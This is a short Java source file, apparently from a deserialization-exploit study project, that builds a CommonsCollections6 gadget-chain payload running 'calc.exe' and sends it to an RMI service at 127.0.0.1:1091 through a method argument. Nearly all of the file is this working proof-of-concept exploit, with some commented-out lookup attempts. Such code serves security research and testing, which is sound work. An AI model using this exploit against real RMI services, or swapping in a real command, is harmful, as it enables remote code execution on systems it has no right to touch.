package org.payload.rmi.rmiServer;

import static org.payload.cc.CC6.CommonsCollections6TemplatesImpl.CommonsCollections6TemplatesImpl;
import java.rmi.Naming;

public class RMIClient {
    public static void main(String[] args) throws Exception {
        Object seri = CommonsCollections6TemplatesImpl("calc.exe");
//        ServiceInterface hello = (ServiceInterface)Naming.lookup("rmi://127.0.0.1:1091/Hello");
//        //String ret = hello.hello(seri);
//        //System.out.println(ret);
//        String ret2 = hello.hello2("aaa");
//        System.out.println(ret2);

        //Registry reg = LocateRegistry.getRegistry("127.0.0.1",1091);
        //reg.bind("rmi://127.0.0.1:1091/Hello", new Service());
        //ServiceInterface hello2 = (ServiceInterface) reg.lookup("Hello");
        ServiceInterface hello2 = (ServiceInterface) Naming.lookup("rmi://127.0.0.1:1091/Hello");
        String ret = hello2.hello(seri);
        //System.out.println(hello2.hello2("aa"));

    }
}